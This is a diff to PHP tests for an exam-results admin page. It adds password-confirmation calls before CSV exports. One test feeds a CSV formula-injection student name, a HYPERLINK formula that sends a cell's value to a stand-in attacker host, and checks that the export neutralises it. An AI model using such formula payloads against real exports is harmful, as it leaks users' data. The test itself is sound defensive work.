@@ -103,6 +103,7 @@ test('the admin results page and CSV export show the table', function () {
     $this->get("/admin/exams/{$this->exam->id}/divisions/{$this->division->id}")
         ->assertSuccessful()->assertSee('Ana')->assertSee('85.0')->assertSee('Pass');
 
+    confirmPassword();
     $csv = $this->get("/admin/exams/{$this->exam->id}/divisions/{$this->division->id}?format=csv")->streamedContent();
     expect($csv)->toContain('Student,')->toContain('"Ana ')->toContain(',170,85,A,Pass,1');
 });
@@ -111,6 +112,7 @@ test('the results export writes a formula-like student name as text', function (
     actingAsRole(Login::ROLE_ADMIN);
     score(enrol('=HYPERLINK("https://evil.example/?"&A1,"Open")'), 0, 90);
 
+    confirmPassword();
     $csv = $this->get("/admin/exams/{$this->exam->id}/divisions/{$this->division->id}?format=csv")->streamedContent();
 
     expect($csv)->toContain('"\'=HYPERLINK(')->not->toContain('"=HYPERLINK(');
